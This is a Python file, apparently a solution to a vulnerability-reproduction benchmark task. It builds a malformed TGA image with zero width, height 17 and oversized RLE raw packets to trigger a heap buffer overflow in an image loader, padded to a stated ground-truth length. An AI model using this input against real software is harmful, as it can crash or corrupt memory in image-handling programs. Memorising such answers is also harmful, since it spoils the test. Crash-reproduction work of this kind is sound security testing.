import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input that triggers a
        Heap Buffer Overflow in a TGA image loader.

        The vulnerability occurs when a TGA file has a width of 0 but a
        non-zero height, and uses Run-Length Encoding (RLE). The loader
        allocates a 0-byte buffer for the image data because the total
        number of pixels (width * height) is 0. However, the RLE decoding
        loop proceeds, iterating 'height' times (once for each scanline).
        In each iteration, it reads an RLE packet header from the file and,
        if it's a raw packet, attempts to read the packet's data into the
        0-byte buffer, causing a heap overflow.

        This PoC constructs such a TGA file:
        - Image width is set to 0.
        - Image height is set to 17.
        - Image type is 9 (RLE, color-mapped).
        - A full 256-entry colormap is included.
        - The "image data" section consists of 17 raw RLE packets, one for
          each scanline the decoder will try to process. The sizes of these
          packets are chosen to match the ground-truth PoC length of 2936 bytes,
          which is large enough to ensure a crash.
        """
        # TGA Header (18 bytes)
        id_length = 0
        colormap_type = 1
        image_type = 9
        
        # Colormap Spec (5 bytes)
        first_entry_index = 0
        colormap_length = 256
        colormap_entry_size = 24
        
        # Image Spec (10 bytes)
        x_origin = 0
        y_origin = 0
        width = 0  # The trigger
        height = 17 # To enter the vulnerable loop
        pixel_depth = 8
        image_descriptor = 0

        header = struct.pack(
            '<BBBHHBHHHHBB',
            id_length,
            colormap_type,
            image_type,
            first_entry_index,
            colormap_length,
            colormap_entry_size,
            x_origin,
            y_origin,
            width,
            height,
            pixel_depth,
            image_descriptor
        )

        # Colormap Data: 256 entries * 3 bytes/entry (24bpp) = 768 bytes
        colormap = b'\x00' * (256 * 3)

        # Image Data: A sequence of RLE packets to cause the overflow.
        # Total size: 2936 (total) - 18 (header) - 768 (colormap) = 2150 bytes.
        # We need 17 packets for the 17 scanlines (height=17).
        image_data = b''

        # A raw RLE packet with max length has header=0x7F, count=128.
        # For 8bpp, this is 128 bytes of data. Total packet size = 1 + 128 = 129 bytes.
        packet_128 = b'\x7F' + (b'\xAA' * 128)
        for _ in range(16):
            image_data += packet_128
        
        # 16 * 129 = 2064 bytes so far.
        # Remaining data needed: 2150 - 2064 = 86 bytes for the 17th packet.
        # Packet size = 86 = 1 (header) + 85 (data).
        # Data length (pixel count) = 85.
        # Raw packet header = count - 1 = 85 - 1 = 84 (0x54).
        packet_85_header = b'\x54'
        packet_85_payload = b'\xBB' * 85
        image_data += packet_85_header + packet_85_payload

        poc = header + colormap + image_data
        return poc
